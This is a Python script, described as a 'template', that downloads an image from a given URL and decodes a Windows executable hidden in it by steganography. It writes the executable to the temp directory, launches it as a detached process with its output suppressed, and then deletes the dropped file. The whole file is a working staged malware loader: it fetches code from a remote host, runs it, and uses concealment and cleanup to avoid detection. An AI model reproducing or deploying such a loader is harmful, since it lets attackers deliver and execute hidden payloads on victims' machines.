#!/usr/bin/env python3
"""fetch_run.py — template: download image -> decode -> execute payload.
Usage: fetch_run.py <https-url> <out-name> [--password P] [--wait] [--keep]
Decode only touches bytes; launching is explicit below.
"""
import os
import subprocess
import sys
import urllib.request

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)),
                                '..', 'python'))
from stegolib import decode_image
from PIL import Image


def main():
    args = sys.argv[1:]
    if len(args) < 2:
        print('usage: fetch_run.py <https-url> <out-name> [--password P] [--wait] [--keep]')
        return 2
    password = ''
    if '--password' in args:
        password = args[args.index('--password') + 1]

    # 1. Download.
    try:
        with urllib.request.urlopen(args[0], timeout=60) as r:
            wire = r.read()
    except Exception as e:
        print(f'download failed: {e}')
        return 1
    with open(os.path.join(os.environ.get('TEMP', '.'), '_fx.png'), 'wb') as f:
        f.write(wire)

    # 2. Decode.
    tmp = os.path.join(os.environ.get('TEMP', '.'), '_fx.png')
    img = Image.open(tmp).convert('RGB')
    os.remove(tmp)
    w, h = img.size
    flat = []
    for r, g, b in img.getdata():
        flat += [r, g, b]
    payload = decode_image(flat, w, h, password=password)
    if not payload or len(payload) < 2:
        print('decode failed')
        return 1
    if payload[:2] != b'MZ':
        print('not a Windows executable (missing MZ), refusing to run')
        return 1

    # 3. Drop + launch (detached unless --wait).
    name = args[1]
    if not name.lower().endswith('.exe'):
        name += '.exe'
    drop = os.path.join(os.environ.get('TEMP', '.'), name)
    with open(drop, 'wb') as f:
        f.write(payload)
    del payload
    try:
        p = subprocess.Popen(
            [drop], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            creationflags=getattr(subprocess, 'DETACHED_PROCESS', 0))
    except Exception as e:
        os.remove(drop)
        print(f'launch failed: {e}')
        return 1
    print(f'launched pid={p.pid}')
    if '--wait' in args:
        print(f'exit code={p.wait()}')
    if '--keep' not in args:
        import time
        time.sleep(2)
        try:
            os.remove(drop)
        except OSError:
            pass
    return 0


if __name__ == '__main__':
    sys.exit(main())
